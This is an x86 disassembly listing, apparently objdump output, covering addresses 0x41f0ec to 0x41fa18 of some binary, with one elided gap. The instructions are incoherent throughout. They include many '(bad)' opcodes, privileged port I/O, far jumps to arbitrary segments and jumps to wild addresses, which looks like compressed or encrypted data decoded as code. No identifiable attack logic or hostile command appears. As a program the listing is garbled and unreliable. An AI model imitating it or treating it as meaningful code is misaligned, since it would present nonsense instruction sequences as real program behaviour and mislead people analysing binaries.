  41f0ec:	es imul esp,esi,0x7f
  41f0f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0f1:	sub    al,0x9c
  41f0f3:	jne    0x41f0dd
  41f0f5:	mov    al,ds:0x9fa0ea34
  41f0fa:	pop    eax
  41f0fb:	jne    0x41f087
  41f0fd:	sub    ebx,DWORD PTR [edi+0x77]
  41f100:	mov    ah,0x4f
  41f102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f103:	push   esp
  41f104:	xor    esp,edi
  41f106:	inc    esi
  41f107:	jge    0x41f155
  41f109:	pop    ebp
  41f10a:	mov    eax,0x6763c33d
  41f10f:	sahf   
  41f110:	(bad)  
  41f111:	test   BYTE PTR [esi],0x18
  41f114:	sub    BYTE PTR [eax+0x3a],cl
  41f117:	outs   dx,BYTE PTR ds:[esi]
  41f118:	jl     0x41f0e6
  41f11a:	push   esp
  41f11b:	lock out dx,eax
  41f11d:	push   cs
  41f11e:	and    ah,ah
  41f120:	adc    edx,edi
  41f122:	ins    DWORD PTR es:[edi],dx
  41f123:	xor    al,0x12
  41f125:	or     eax,0x3068d1aa
  41f12a:	fwait
  41f12b:	inc    esp
  41f12c:	sbb    eax,0x620884e1
  41f131:	loopne 0x41f0c4
  41f133:	pop    esp
  41f134:	gs add eax,0xb5131648
  41f13a:	retf   0x87a8
  41f13d:	push   esp
  41f13e:	dec    ebp
  41f13f:	and    DWORD PTR [ecx-0x41954dcd],0xcf337c00
  41f149:	adc    esi,edx
  41f14b:	xor    bl,BYTE PTR [edx-0x3a598439]
  41f151:	scas   eax,DWORD PTR es:[edi]
  41f152:	in     eax,dx
  41f153:	push   esi
  41f154:	int3   
  41f155:	inc    esi
  41f156:	retf   0x3580
  41f159:	iret   
  41f15a:	data16 fnstcw WORD PTR [ecx]
  41f15d:	lods   al,BYTE PTR ds:[esi]
  41f15e:	les    edi,FWORD PTR [ebx+eiz*8-0x267b755b]
  41f165:	sub    bh,BYTE PTR [ecx+0x1a]
  41f168:	(bad)  
  41f169:	daa    
  41f16a:	mov    BYTE PTR [eax+esi*2-0x42ddc480],dh
  41f171:	jmp    0xf6025148
  41f176:	pop    ecx
  41f177:	mov    al,bl
  41f179:	jg     0x41f17f
  41f17b:	sahf   
  41f17c:	(bad)  
  41f17e:	outs   dx,BYTE PTR ds:[esi]
  41f17f:	mov    ch,0x9a
  41f181:	loopne 0x41f1af
  41f183:	imul   ecx,DWORD PTR [edi+0x3c],0xffffff91
  41f187:	bound  edi,QWORD PTR [ebx]
  41f189:	push   edx
  41f18a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f18b:	push   ds
  41f18c:	and    eax,DWORD PTR [eax]
  41f18e:	or     eax,esi
  41f190:	fsubr  DWORD PTR [edi+0x60]
  41f193:	add    BYTE PTR [esi+eax*4+0x79eaeac8],dl
  41f19a:	xchg   ebp,eax
  41f19b:	cli    
  41f19c:	cmp    al,0x31
  41f19e:	cmc    
  41f19f:	or     eax,0x1f8248ec
  41f1a4:	shl    bh,1
  41f1a6:	cwde   
  41f1a7:	fmul   DWORD PTR [edx-0x55]
  41f1aa:	xchg   esp,eax
  41f1ab:	int    0xfa
  41f1ad:	pop    ds
  41f1ae:	add    dh,BYTE PTR [ebx+0x7496644f]
  41f1b4:	xor    bl,BYTE PTR [ebp+0x40]
  41f1b7:	lock ds inc edx
  41f1ba:	mul    al
  41f1bc:	pop    ss
  41f1bd:	ja     0x41f1ca
  41f1bf:	sub    bh,BYTE PTR [edx-0x44]
  41f1c2:	stc    
  41f1c3:	jge    0x41f20f
  41f1c5:	(bad)  
  41f1c6:	and    edi,DWORD PTR es:[ebx-0x2a689e77]
  41f1cd:	mov    bl,0x63
  41f1cf:	cmp    eax,0x1b59e0a
  41f1d4:	pop    eax
  41f1d5:	sbb    al,0x2f
  41f1d7:	dec    esi
  41f1d8:	outs   dx,BYTE PTR cs:[esi]
  41f1da:	lods   al,BYTE PTR ds:[esi]
  41f1db:	inc    edi
  41f1dc:	pop    edx
  41f1dd:	and    DWORD PTR [edx],ecx
  41f1df:	pushf  
  41f1e0:	fs repz stc 
  41f1e3:	mov    ah,bh
  41f1e5:	in     eax,0xfe
  41f1e7:	jo     0x41f18a
  41f1e9:	addr16 gs test al,0x59
  41f1ed:	aad    0x2
  41f1ef:	repz icebp 
  41f1f1:	adc    DWORD PTR [ebx+edx*4+0x15],edx
  41f1f5:	enter  0xaeb4,0x4e
  41f1f9:	add    ebx,DWORD PTR [esi-0x7ebfdc5f]
  41f1ff:	in     eax,dx
  41f200:	sbb    eax,0x345c38a9
  41f205:	mov    WORD PTR [eax],gs
  41f207:	sub    ebx,DWORD PTR [eax]
  41f209:	mov    edi,0x7e0742b
  41f20e:	lods   al,BYTE PTR ds:[esi]
  41f20f:	xchg   esp,eax
  41f210:	push   ds
  41f211:	fstp   DWORD PTR [esi]
  41f213:	jne    0x41f1a4
  41f215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f216:	(bad)  
  41f217:	test   BYTE PTR [eax-0x5],0xac
  41f21b:	pushf  
  41f21c:	pop    es
  41f21d:	sbb    BYTE PTR [esi+0x768ea721],bh
  41f223:	inc    BYTE PTR [ebx]
  41f225:	push   edi
  41f226:	push   0x4e17e7f8
  41f22b:	pop    esi
  41f22c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f22d:	sub    edx,DWORD PTR ds:0xdda8bbd2
  41f233:	xchg   esp,eax
  41f234:	imul   BYTE PTR [edx+0x35]
  41f237:	(bad)  
  41f238:	pop    edx
  41f239:	and    bl,BYTE PTR [ebx+0x55]
  41f23c:	xor    DWORD PTR [ebp-0x60],0x6f
  41f240:	push   esp
  41f241:	cmp    al,0x5d
  41f243:	mov    ebp,0x27fd69ad
  41f248:	add    ah,BYTE PTR [ebp-0x8ed4902]
  41f24e:	inc    BYTE PTR [edx+0x33574f9]
  41f254:	xchg   edx,eax
  41f255:	call   FWORD PTR [eax+edi*4+0x57b53d74]
  41f25c:	jmp    0x3525e634
  41f261:	mov    ebp,DWORD PTR [edi+0xd731103]
  41f267:	sub    ch,BYTE PTR [ebx]
  41f269:	xchg   ebx,eax
  41f26a:	push   ds
  41f26b:	shr    BYTE PTR [edi+edi*8-0x6a],cl
  41f26f:	iret   
  41f270:	jns    0x41f251
  41f272:	add    esp,0x36
  41f275:	mov    ebp,0x663aa4eb
  41f27a:	shr    BYTE PTR [edi],cl
  41f27c:	jg     0x41f26f
  41f27e:	push   edi
  41f27f:	cdq    
  41f280:	or     edx,DWORD PTR [ebx]
  41f282:	jmp    0xe0f98261
  41f287:	std    
  41f288:	push   edx
  41f289:	data16 mov cl,0x6c
  41f28c:	mov    edx,DWORD PTR [ebx]
  41f28e:	adc    eax,0xc0e0487b
  41f293:	cmp    al,BYTE PTR [edx+0x48b375dc]
  41f299:	sbb    ebp,ecx
  41f29b:	inc    esi
  41f29c:	retf   0x35b9
  41f29f:	mov    ebp,0xf0af059c
  41f2a4:	leave  
  41f2a5:	push   esi
  41f2a6:	mov    al,0x1b
  41f2a8:	pop    ds
  41f2a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2aa:	mov    esi,0xd47754ed
  41f2af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2b0:	mov    bh,0x37
  41f2b2:	shr    DWORD PTR [ebx+0x52940c24],0x0
  41f2b9:	ror    BYTE PTR [esi+0x44],1
  41f2bc:	popa   
  41f2bd:	xchg   edi,eax
  41f2be:	in     al,0x89
  41f2c0:	fsubr  QWORD PTR [ebp+edx*2+0x62cafe06]
  41f2c7:	sahf   
  41f2c8:	popf   
  41f2c9:	push   ebp
  41f2ca:	inc    esp
  41f2cb:	bound  edx,QWORD PTR [eax+0x7e0731b0]
  41f2d1:	mov    ebp,0x48a1f1b4
  41f2d6:	push   ebx
  41f2d7:	clc    
  41f2d8:	fidivr DWORD PTR [esi+0x47]
  41f2db:	mov    ds:0xc589f936,al
  41f2e0:	ficom  DWORD PTR [eax-0x88ab76a]
  41f2e6:	adc    eax,0xbf97e40c
  41f2eb:	adc    dh,BYTE PTR [ecx-0x20]
  41f2ee:	loope  0x41f2b5
  41f2f0:	mov    cl,0xbb
  41f2f2:	cdq    
  41f2f3:	mov    dh,BYTE PTR [ecx+0x37]
  41f2f6:	xor    al,0xee
  41f2f8:	retf   
  41f2f9:	ins    DWORD PTR es:[edi],dx
  41f2fa:	arpl   WORD PTR [ebx],bp
  41f2fc:	or     eax,0x471e3a2f
  41f301:	test   BYTE PTR [edi+0x4],ah
  41f304:	mov    ah,0xd5
  41f306:	or     ah,BYTE PTR [eax+0x14]
  41f309:	pop    edx
  41f30a:	pop    ecx
  41f30b:	in     eax,dx
  41f30c:	stos   BYTE PTR es:[edi],al
  41f30d:	pushf  
  41f30e:	xor    eax,0x66bc7ead
  41f313:	cmp    al,0xf
  41f315:	pushf  
  41f316:	adc    eax,0xf190ba8e
  41f31b:	xor    BYTE PTR [eax+0x44148237],bh
  41f321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f322:	rcr    BYTE PTR [ebp+0x5],1
  41f325:	lock fiadd WORD PTR [esi-0x12]
  41f329:	sbb    dh,al
  41f32b:	(bad)  
  41f32d:	(bad)  
  41f32e:	in     al,dx
  41f32f:	mov    dh,0x4b
  41f331:	rol    ecx,1
  41f333:	xor    ah,BYTE PTR ds:0xa58d3e0b
  41f339:	adc    edi,esp
  41f33b:	fisub  WORD PTR [eax+0x25e421da]
  41f341:	test   bl,0x8f
  41f344:	inc    ebp
  41f345:	pop    edx
  41f346:	cmp    ebp,eax
  41f348:	inc    ebx
  41f349:	push   esp
  41f34a:	inc    esp
  41f34b:	sub    ebx,ebx
  41f34d:	scas   eax,DWORD PTR es:[edi]
  41f34e:	and    eax,0xedf2b456
  41f353:	and    BYTE PTR [eax],dh
  41f355:	fld    DWORD PTR [eax]
  41f357:	mov    bl,bl
  41f359:	(bad)  
  41f35a:	enter  0xd486,0x86
  41f35e:	repz or DWORD PTR [edx],edi
  41f361:	adc    DWORD PTR [edx+0x5c92704b],ebx
  41f367:	js     0x41f376
  41f369:	int3   
  41f36a:	xchg   DWORD PTR [esi],eax
  41f36c:	fs pop ebx
  41f36e:	adc    bl,BYTE PTR [edx+0x73]
  41f371:	aas    
  41f372:	pop    esi
  41f373:	out    0xc3,eax
  41f375:	(bad)  
  41f377:	mov    ch,0x22
  41f379:	and    edi,esi
  41f37b:	dec    ebx
  41f37c:	outs   dx,BYTE PTR ds:[esi]
  41f37d:	jno    0x41f37d
  41f37f:	mov    bl,0xd1
  41f381:	aam    0xe4
  41f383:	sub    eax,0xfc31d3eb
  41f388:	add    BYTE PTR [edx-0x1f496d51],cl
  41f38e:	mov    bh,BYTE PTR [ebp+0x64bdfe89]
  41f394:	popa   
  41f395:	adc    eax,ebx
  41f397:	test   eax,0x2364a165
  41f39c:	fs sub ch,dl
  41f39f:	add    al,0x6d
  41f3a1:	xor    al,0x47
  41f3a3:	xchg   DWORD PTR [edx-0x3a096469],edi
  41f3a9:	push   ebp
  41f3aa:	or     ah,BYTE PTR [ebx-0x4d]
  41f3ad:	and    BYTE PTR [eax],cl
  41f3af:	cmp    esp,ebx
  41f3b1:	sti    
  41f3b2:	xchg   ebp,eax
  41f3b3:	add    eax,0x9fce262e
  41f3b8:	jmp    0x41f3d7
  41f3ba:	lea    edi,[ecx]
  41f3bc:	(bad)  
  41f3bd:	mov    cl,0xe6
  41f3bf:	div    BYTE PTR [esi]
  41f3c1:	loope  0x41f382
  41f3c3:	int    0xd8
  41f3c5:	fsubr  QWORD PTR [edi-0x2c07f14]
  41f3cb:	rol    bh,0xfd
  41f3ce:	adc    BYTE PTR [ebp+0x7f3fc1c3],ch
  41f3d4:	pushf  
  41f3d5:	aaa    
  41f3d6:	mov    bh,0xa7
  41f3d8:	xchg   esi,eax
  41f3d9:	add    BYTE PTR [ebx],ah
  41f3db:	imul   edi,edi,0xffffff95
  41f3de:	loop   0x41f39e
  41f3e0:	cmp    edx,DWORD PTR [eax-0x5ecd9466]
  41f3e6:	aas    
  41f3e7:	gs call 0xa769cdd3
  41f3ed:	inc    ebp
  41f3ee:	add    al,0xa4
  41f3f0:	out    0xad,eax
  41f3f2:	xchg   ebp,eax
  41f3f3:	xchg   edx,eax
  41f3f4:	jp     0x41f38f
  41f3f6:	test   al,0x48
  41f3f8:	push   esp
  41f3f9:	sub    DWORD PTR ds:0xa1959645,ebp
  41f3ff:	rol    ecx,1
  41f401:	cmp    eax,0xbeea06fd
  41f406:	add    ecx,edx
  41f408:	cli    
  41f409:	out    0x10,eax
  41f40b:	jg     0x41f3a3
  41f40d:	adc    esi,DWORD PTR [eax]
  41f40f:	nop
  41f410:	stos   BYTE PTR es:[edi],al
  41f411:	dec    eax
  41f412:	pop    ebp
  41f413:	mov    ch,0x87
  41f415:	adc    al,BYTE PTR [eax]
	...
  41f5e3:	add    BYTE PTR [eax],al
  41f5e5:	add    BYTE PTR [edi+0x5d7b4dd7],al
  41f5eb:	sti    
  41f5ec:	mov    bh,0xff
  41f5ee:	ds aad 0x54
  41f5f1:	ret    0x1e76
  41f5f4:	in     al,dx
  41f5f5:	aaa    
  41f5f6:	inc    ecx
  41f5f7:	call   0x0:0x71e0001
  41f5fe:	sbb    DWORD PTR [edi-0x5c],esp
  41f601:	mov    esp,DWORD PTR gs:0x8aae03c2
  41f608:	dec    ebx
  41f609:	sar    edx,cl
  41f60b:	or     dh,BYTE PTR ss:[esi+0xc]
  41f60f:	or     BYTE PTR [edi],ch
  41f611:	arpl   WORD PTR [esi+0x4ff8aec1],di
  41f617:	cmp    ecx,0xffffffd2
  41f61a:	out    0x5d,al
  41f61c:	and    ah,BYTE PTR [esi+0x58]
  41f61f:	(bad)  
  41f620:	push   esi
  41f621:	jmp    FWORD PTR [ebx+0x5255dcfa]
  41f627:	sub    ebp,edi
  41f629:	imul   edi,DWORD PTR [ecx],0x1
  41f62c:	pop    ebx
  41f62d:	mov    bl,BYTE PTR [edx+0x60398401]
  41f633:	mov    al,BYTE PTR [ebp+0x3f2efb21]
  41f639:	mov    bl,0x47
  41f63b:	rol    BYTE PTR [esi],cl
  41f63d:	xchg   ecx,eax
  41f63e:	xor    BYTE PTR [esi-0x4c],0x39
  41f642:	int    0x23
  41f644:	rcr    DWORD PTR [edi],0x29
  41f647:	(bad)  
  41f648:	sti    
  41f649:	addr16 cmp eax,0x2c9652a1
  41f64f:	inc    DWORD PTR [edx-0x6c]
  41f652:	repnz push es
  41f654:	adc    DWORD PTR [edi-0x61],edx
  41f657:	fdiv   st,st(5)
  41f659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f65a:	psubusb mm6,QWORD PTR [edx-0x1095180c]
  41f661:	js     0x41f600
  41f663:	test   eax,0xa2e1e158
  41f668:	imul   bh
  41f66a:	cdq    
  41f66b:	arpl   WORD PTR [edx+0x17],ax
  41f66e:	les    ecx,FWORD PTR [ecx-0x80]
  41f671:	pcmpeqb mm0,mm0
  41f674:	or     eax,0x7fd9fd1f
  41f679:	mov    bh,0x6d
  41f67b:	jnp    0x41f623
  41f67d:	(bad)  
  41f67e:	cli    
  41f67f:	pushf  
  41f680:	jmp    0x8e881d3
  41f685:	hlt    
  41f686:	fs ret 
  41f688:	leave  
  41f689:	push   ebp
  41f68a:	pushf  
  41f68b:	ss xchg ebp,eax
  41f68d:	or     al,0xb3
  41f68f:	mov    fs,WORD PTR [esi-0x58]
  41f692:	adc    al,0x88
  41f694:	mov    ebx,0x8027ee3a
  41f699:	ror    ebx,0xeb
  41f69c:	xchg   esi,eax
  41f69d:	enter  0xfa2c,0x43
  41f6a1:	icebp  
  41f6a2:	pop    edx
  41f6a3:	dec    ebp
  41f6a4:	pop    ds
  41f6a5:	mov    ch,0xcc
  41f6a7:	shl    al,1
  41f6a9:	jmp    0xbffaafbb
  41f6ae:	push   esp
  41f6af:	jae    0x41f67c
  41f6b1:	ins    DWORD PTR es:[edi],dx
  41f6b2:	adc    DWORD PTR [edx-0x4d],edx
  41f6b5:	pop    ebx
  41f6b6:	cmp    bh,bl
  41f6b8:	jmp    0x89e6bbff
  41f6bd:	enter  0x4a95,0xbd
  41f6c1:	jne    0x41f651
  41f6c3:	stos   DWORD PTR es:[edi],eax
  41f6c4:	sub    BYTE PTR [edx-0xf],al
  41f6c7:	lods   eax,DWORD PTR ds:[esi]
  41f6c8:	addr16 pop es
  41f6ca:	jb     0x41f68e
  41f6cc:	xchg   esp,eax
  41f6cd:	pusha  
  41f6ce:	xchg   edi,eax
  41f6cf:	inc    eax
  41f6d0:	fst    DWORD PTR [ecx+0x1]
  41f6d3:	mov    ch,0xc
  41f6d5:	pop    esi
  41f6d6:	and    BYTE PTR [eax-0x18],bh
  41f6d9:	dec    esp
  41f6da:	pop    eax
  41f6db:	popa   
  41f6dc:	xchg   ebp,eax
  41f6dd:	jo     0x41f683
  41f6df:	and    eax,0x93355a9f
  41f6e4:	jo     0x41f697
  41f6e6:	repnz and dl,bh
  41f6e9:	mov    ch,0x0
  41f6eb:	sub    DWORD PTR [ecx],edi
  41f6ed:	inc    edx
  41f6ee:	sub    ah,dl
  41f6f0:	outs   dx,DWORD PTR ds:[esi]
  41f6f1:	mov    dh,0xd1
  41f6f3:	push   DWORD PTR [edi+0x37]
  41f6f6:	sub    BYTE PTR ds:0xf5925658,cl
  41f6fc:	fwait
  41f6fd:	push   ds
  41f6fe:	nop
  41f6ff:	cmp    eax,0xada8a991
  41f704:	jo     0x41f766
  41f706:	es iret 
  41f708:	(bad)  
  41f709:	out    0xf9,al
  41f70b:	icebp  
  41f70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f70d:	jmp    0x30c9:0x51048217
  41f714:	ins    BYTE PTR es:[edi],dx
  41f715:	ror    BYTE PTR [ebp+0x33],0x69
  41f719:	sbb    eax,0x69670013
  41f71e:	pop    es
  41f71f:	inc    ecx
  41f720:	jecxz  0x41f736
  41f722:	push   ds
  41f723:	xchg   edi,eax
  41f724:	fnstcw WORD PTR [ebp-0x18]
  41f727:	jbe    0x41f6ad
  41f729:	aaa    
  41f72a:	popf   
  41f72b:	and    edi,esi
  41f72d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f72e:	ins    DWORD PTR es:[edi],dx
  41f72f:	out    dx,eax
  41f730:	in     eax,0x77
  41f732:	or     ebx,DWORD PTR [edx-0x5e]
  41f735:	pop    ss
  41f736:	xchg   esp,eax
  41f737:	call   0xab40:0x9574979e
  41f73e:	bound  edi,QWORD PTR [ecx+0x2f]
  41f741:	cmp    ah,BYTE PTR [esi+0x2d1c816d]
  41f747:	inc    esi
  41f748:	mov    ds:0xebf6b1fe,al
  41f74d:	pop    edi
  41f74e:	xor    esp,ebp
  41f750:	jle    0x41f7b8
  41f752:	sub    eax,0x2596ea71
  41f757:	mov    ds:0xa4e571df,al
  41f75c:	fsub   st(5),st
  41f75e:	xchg   edi,eax
  41f75f:	sub    BYTE PTR [eax+0xc25af55],bh
  41f765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f766:	in     eax,0x2d
  41f768:	xor    al,0xf3
  41f76a:	push   DWORD PTR [ebp-0x45]
  41f76d:	popw   es
  41f76f:	sub    BYTE PTR [ebx*2-0x67718e0e],dh
  41f776:	jge    0x41f7a3
  41f778:	loopne 0x41f73b
  41f77a:	cmp    edx,edi
  41f77c:	xchg   ebp,eax
  41f77d:	xor    ebp,esp
  41f77f:	and    esp,DWORD PTR [eax-0x5994ec54]
  41f785:	sbb    ah,BYTE PTR [edi-0x2a8b6ea0]
  41f78b:	icebp  
  41f78c:	in     eax,dx
  41f78d:	aas    
  41f78e:	test   DWORD PTR [eax-0x62],esp
  41f791:	add    eax,0xa513257d
  41f796:	dec    edx
  41f797:	mov    esi,0x645fabf7
  41f79c:	gs mov cl,0x3a
  41f79f:	add    al,0xab
  41f7a1:	pop    ecx
  41f7a2:	sar    DWORD PTR [esi+0x2be56140],0x72
  41f7a9:	adc    DWORD PTR [ebx],0xfffffff0
  41f7ac:	jmp    0x3ba10b2d
  41f7b1:	cmp    edx,DWORD PTR [edi]
  41f7b3:	inc    esp
  41f7b4:	push   eax
  41f7b5:	fidiv  DWORD PTR [edx-0x3808a38]
  41f7bb:	xchg   edi,eax
  41f7bc:	xor    al,0x29
  41f7be:	push   esi
  41f7bf:	(bad)  
  41f7c0:	not    BYTE PTR [eax]
  41f7c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7c3:	jmp    0x200e3a7d
  41f7c8:	out    dx,eax
  41f7c9:	inc    esp
  41f7ca:	mov    esp,0x14f0504b
  41f7cf:	pop    edi
  41f7d0:	imul   edi,esp,0xffffffbe
  41f7d3:	push   ss
  41f7d4:	jp     0x41f807
  41f7d6:	out    0xbc,eax
  41f7d8:	rol    DWORD PTR [ebp-0xff1a45],cl
  41f7de:	shl    cl,cl
  41f7e0:	and    ecx,DWORD PTR [esp+edi*1+0x6]
  41f7e4:	stos   DWORD PTR es:[edi],eax
  41f7e5:	and    DWORD PTR [ecx+0x59a04cf8],0x283df5eb
  41f7ef:	out    dx,eax
  41f7f0:	push   ds
  41f7f1:	aad    0x23
  41f7f3:	rcr    DWORD PTR [edi-0x29640526],cl
  41f7f9:	jmp    0xf8391d7a
  41f7fe:	out    0x72,al
  41f800:	fst    QWORD PTR cs:[ebx+0x652cc523]
  41f807:	inc    esi
  41f808:	inc    eax
  41f809:	adc    edi,DWORD PTR [edx]
  41f80b:	jecxz  0x41f80d
  41f80d:	dec    esp
  41f80e:	rep ss stos DWORD PTR es:[edi],eax
  41f811:	mov    BYTE PTR [ebp-0x7460dd31],0xe9
  41f818:	sub    ah,BYTE PTR [esi]
  41f81a:	cmp    ch,bl
  41f81c:	out    dx,al
  41f81d:	inc    edi
  41f81e:	into   
  41f81f:	outs   dx,DWORD PTR ds:[esi]
  41f820:	mov    ecx,0xfcf35d4f
  41f825:	or     BYTE PTR [ecx-0x41aaf74a],bl
  41f82b:	fdiv   DWORD PTR [eax-0x75]
  41f82e:	cmovae eax,DWORD PTR [eax-0x1e]
  41f832:	js     0x41f859
  41f834:	or     al,0x6f
  41f836:	xchg   BYTE PTR [ebx-0x3e1510e8],ah
  41f83c:	lods   al,BYTE PTR ds:[esi]
  41f83d:	cmc    
  41f83e:	(bad)  
  41f83f:	stc    
  41f840:	sbb    eax,0x29c903e0
  41f845:	mov    BYTE PTR [eax-0x6231d81b],dl
  41f84b:	or     al,0xb0
  41f84d:	nop
  41f84e:	add    eax,0xfa6f0d28
  41f853:	dec    bl
  41f855:	sub    ebx,edx
  41f857:	mov    bh,0xb
  41f859:	mov    al,ds:0x116979d3
  41f85e:	ret    
  41f85f:	sub    eax,0x9e2ec671
  41f864:	jnp    0x41f897
  41f866:	mov    ds:0xa57e839e,eax
  41f86b:	mov    dh,0xd9
  41f86d:	xchg   esi,eax
  41f86e:	jns    0x41f885
  41f870:	xor    ch,BYTE PTR [ecx+0x3f]
  41f873:	mov    BYTE PTR [ebp+0x2a164e73],ch
  41f879:	mov    ds,WORD PTR [edi+0x2e]
  41f87c:	add    esi,edi
  41f87e:	cmp    al,0xc0
  41f880:	inc    esi
  41f881:	mov    BYTE PTR [edi-0x54],ah
  41f884:	lea    edx,[eax-0x616dd567]
  41f88a:	dec    esi
  41f88b:	xor    esp,ecx
  41f88d:	dec    edx
  41f88e:	pusha  
  41f88f:	ret    0xd99e
  41f892:	in     al,0x2
  41f894:	dec    edx
  41f895:	mov    eax,0xccbbe5a7
  41f89a:	mov    ds:0x9c027820,eax
  41f89f:	test   al,0x93
  41f8a1:	push   ecx
  41f8a2:	aas    
  41f8a3:	sub    BYTE PTR [esi-0x20],dl
  41f8a6:	cld    
  41f8a7:	jnp    0x41f885
  41f8a9:	xor    DWORD PTR [ebx+0x3e],0xc3ca3370
  41f8b0:	dec    ebp
  41f8b1:	test   DWORD PTR [edi],ebx
  41f8b3:	imul   esp,DWORD PTR [ebx+0x48],0x69245fe6
  41f8ba:	mov    cl,0x37
  41f8bc:	(bad)  
  41f8bd:	outs   dx,DWORD PTR ds:[esi]
  41f8be:	in     al,0xb
  41f8c0:	out    dx,eax
  41f8c1:	cmp    eax,0x8c585aaf
  41f8c6:	add    dl,BYTE PTR [ecx]
  41f8c8:	mov    al,0x3b
  41f8ca:	jae    0x41f8cb
  41f8cc:	addr16 ds (bad) 
  41f8cf:	jo     0x41f854
  41f8d1:	sub    al,0x10
  41f8d3:	retf   0x17e8
  41f8d6:	xchg   esi,eax
  41f8d7:	inc    esi
  41f8d8:	lock out dx,eax
  41f8da:	mov    ds:0xbccd264,al
  41f8df:	mov    BYTE PTR ds:0x691f8c67,bl
  41f8e5:	sub    BYTE PTR [ebx],cl
  41f8e7:	or     DWORD PTR [ebp-0x373f6359],ebp
  41f8ed:	ror    DWORD PTR [esi],cl
  41f8ef:	and    DWORD PTR [edi-0x2ba90b4f],ecx
  41f8f5:	dec    edi
  41f8f6:	mov    al,0x97
  41f8f8:	xchg   edi,eax
  41f8f9:	jo     0x41f916
  41f8fb:	les    eax,FWORD PTR [esi-0x44e5aa3f]
  41f901:	fst    st(2)
  41f903:	jb     0x41f960
  41f905:	out    dx,eax
  41f906:	(bad)  
  41f907:	inc    bl
  41f909:	aam    0xe1
  41f90b:	mov    dl,0x7b
  41f90d:	cmp    BYTE PTR [ebp+0x51],cl
  41f910:	es test eax,0x8dfc8d8a
  41f916:	sbb    BYTE PTR [edx+esi*2-0x3d],0xf
  41f91b:	inc    eax
  41f91c:	mov    ds:0x1ba2a721,eax
  41f921:	rol    BYTE PTR [edx],cl
  41f923:	sbb    eax,0xddf978d7
  41f928:	sub    eax,DWORD PTR [ecx]
  41f92a:	jmp    0xbcd2:0xb938ae3e
  41f931:	mov    DWORD PTR [edi+0x3],ecx
  41f934:	test   eax,0xddb372dd
  41f939:	push   ds
  41f93a:	test   DWORD PTR [ebp-0x58],eax
  41f93d:	sbb    BYTE PTR [esi+edx*2-0x28d7d879],ch
  41f944:	repz lea ebp,[ebp-0x6439b4fa]
  41f94b:	jne    0x41f8ef
  41f94d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f94e:	push   eax
  41f94f:	in     eax,dx
  41f950:	adc    edx,DWORD PTR [ecx]
  41f952:	inc    ecx
  41f953:	ja     0x41f92e
  41f955:	push   ebp
  41f956:	pop    esp
  41f957:	jbe    0x41f951
  41f959:	fstp   DWORD PTR [eax]
  41f95b:	push   cs
  41f95c:	lahf   
  41f95d:	sub    BYTE PTR [esi],0xca
  41f960:	adc    ah,bh
  41f962:	xchg   edi,eax
  41f963:	fwait
  41f964:	jg     0x41f948
  41f966:	pop    edx
  41f967:	xchg   esp,eax
  41f968:	fwait
  41f969:	push   eax
  41f96a:	inc    esp
  41f96b:	fadd   DWORD PTR ds:0xa816b957
  41f971:	cmp    DWORD PTR [edi+0x42],edx
  41f974:	int3   
  41f975:	mov    edi,0xfbcac816
  41f97a:	cli    
  41f97b:	add    DWORD PTR [edi-0x4cd35d93],edx
  41f981:	fnstsw WORD PTR [ecx]
  41f983:	push   ds
  41f984:	outs   dx,BYTE PTR ds:[esi]
  41f985:	ret    
  41f986:	inc    ecx
  41f987:	sbb    al,BYTE PTR [edi-0x2e0dab62]
  41f98d:	pop    ebp
  41f98e:	push   0xffffffd2
  41f990:	mov    ecx,0x404a7df8
  41f995:	mov    ch,0x7a
  41f997:	xor    al,0x1e
  41f999:	bound  edi,QWORD PTR [edi+0x50e36d80]
  41f99f:	xlat   BYTE PTR ds:[ebx]
  41f9a0:	in     al,0xf3
  41f9a2:	imul   BYTE PTR [edi]
  41f9a4:	call   0xa9dd1693
  41f9a9:	mov    esp,0xb483cd1
  41f9ae:	mov    al,BYTE PTR [ebx-0x5b358bf5]
  41f9b4:	leave  
  41f9b5:	jmp    0xf65d:0x38bba46b
  41f9bc:	add    eax,0x363edff2
  41f9c1:	xchg   edi,eax
  41f9c2:	(bad)  
  41f9c3:	test   al,0x91
  41f9c5:	pop    esi
  41f9c6:	jecxz  0x41f9f2
  41f9c8:	mov    ah,0xde
  41f9ca:	or     edx,edx
  41f9cc:	shr    BYTE PTR [esi-0x6e4ffd39],1
  41f9d2:	cmp    al,0xf9
  41f9d4:	ins    DWORD PTR es:[edi],dx
  41f9d5:	dec    eax
  41f9d6:	mov    dh,0xa9
  41f9d8:	xchg   esi,eax
  41f9d9:	test   BYTE PTR [edx-0x59],al
  41f9dc:	mov    ch,0x6a
  41f9de:	jne    0x41fa14
  41f9e0:	dec    esi
  41f9e1:	shl    BYTE PTR [ecx-0x47],1
  41f9e4:	stos   DWORD PTR es:[edi],eax
  41f9e5:	clc    
  41f9e6:	fsub   st,st(6)
  41f9e8:	sbb    ebp,DWORD PTR [edi+0x30]
  41f9eb:	icebp  
  41f9ec:	bound  ebp,QWORD PTR [esi-0x1d]
  41f9ef:	mov    eax,0xaaf265ff
  41f9f4:	pushf  
  41f9f5:	mov    edx,0x42986cd6
  41f9fa:	xchg   esp,eax
  41f9fb:	cld    
  41f9fc:	sbb    ebp,eax
  41f9fe:	jns    0x41fa05
  41fa00:	xchg   DWORD PTR [edx],edx
  41fa02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa03:	aaa    
  41fa04:	mov    edi,0x7a0ade3d
  41fa09:	add    bh,cl
  41fa0b:	(bad)  
  41fa0d:	jns    0x41fa30
  41fa0f:	test   DWORD PTR [ecx-0x31],0xb464ce07
  41fa16:	rcl    ebp,cl
  41fa18:	inc    edx
